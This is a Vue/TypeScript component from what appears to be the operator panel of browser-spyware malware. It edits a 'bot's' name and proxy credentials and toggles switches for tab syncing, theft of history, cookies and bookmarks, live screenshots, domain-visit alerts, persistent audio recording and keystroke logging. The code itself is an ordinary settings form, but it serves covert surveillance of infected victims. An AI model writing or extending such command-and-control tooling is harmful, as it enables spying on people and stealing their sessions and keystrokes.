<script setup lang="ts">
import { ref, watch } from 'vue'
import { bots } from '@/api/endpoints'
import Btn from '@/components/ui/Btn.vue'
import Field from '@/components/ui/Field.vue'
import type { BotSummary } from '@/types/api'

const props = defineProps<{ bot: BotSummary }>()
const emit = defineEmits<{ saved: [] }>()

const name = ref(props.bot.name)
const proxyUsername = ref(props.bot.proxy_username)
const proxyPassword = ref(props.bot.proxy_password)
const switchConfig = ref<Record<string, boolean>>(
  Object.fromEntries(
    Object.entries(props.bot.switch_config ?? {}).map(([k, v]) => [k, Boolean(v)]),
  ),
)
const saving = ref(false)
const error = ref<string | null>(null)

watch(
  () => props.bot,
  (b) => {
    name.value = b.name
    proxyUsername.value = b.proxy_username
    proxyPassword.value = b.proxy_password
    switchConfig.value = Object.fromEntries(
      Object.entries(b.switch_config ?? {}).map(([k, v]) => [k, Boolean(v)]),
    )
  },
)

const switches: { key: string; label: string; help: string }[] = [
  { key: 'SYNC', label: 'Tabs sync', help: 'Sync open tabs in real-time.' },
  { key: 'SYNC_HUGE', label: 'History/cookies/bookmarks sync', help: 'Sync large datasets periodically.' },
  { key: 'REALTIME_IMG', label: 'Live thumbnail', help: 'Send a live screenshot of the active tab.' },
  { key: 'NOTIFICATION', label: 'Domain notifications', help: 'Notify on monitored domain visits.' },
  { key: 'PERSISTENT_RECORDING', label: 'Persistent audio', help: 'Keep recording across navigations.' },
  { key: 'PERSISTENT_KEYBOARD', label: 'Persistent keyboard', help: 'Keep keystroke logging across navigations.' },
]

async function save(): Promise<void> {
  saving.value = true
  error.value = null
  try {
    await bots.update(props.bot.id, {
      name: name.value,
      proxy_username: proxyUsername.value,
      proxy_password: proxyPassword.value,
      switch_config: switchConfig.value,
    })
    emit('saved')
  } catch (e) {
    error.value = e instanceof Error ? e.message : 'update failed'
  } finally {
    saving.value = false
  }
}
</script>

<template>
  <div class="space-y-4 max-w-[640px]">
    <Field v-model="name" label="Display name" />
    <div class="grid grid-cols-2 gap-3">
      <Field v-model="proxyUsername" label="Proxy username" />
      <Field v-model="proxyPassword" label="Proxy password" />
    </div>

    <div>
      <h4 class="text-[11px] uppercase tracking-wider text-fg-faint mb-2">
        Telemetry switches
      </h4>
      <div class="surface divide-y divide-border-subtle">
        <label
          v-for="s in switches"
          :key="s.key"
          class="px-3 py-2.5 flex items-center gap-3 cursor-pointer hover:bg-bg-hover/60"
        >
          <div class="flex-1">
            <div class="text-[12px] font-medium">{{ s.label }}</div>
            <div class="text-[11px] text-fg-faint">{{ s.help }}</div>
          </div>
          <input
            type="checkbox"
            class="size-4 accent-accent"
            :checked="switchConfig[s.key] ?? false"
            @change="
              (e) =>
                (switchConfig[s.key] = (e.target as HTMLInputElement).checked)
            "
          />
        </label>
      </div>
    </div>

    <p v-if="error" class="text-danger text-[12px] mono">{{ error }}</p>

    <div class="flex items-center gap-2">
      <Btn variant="primary" :loading="saving" @click="save">Save changes</Btn>
    </div>
  </div>
</template>
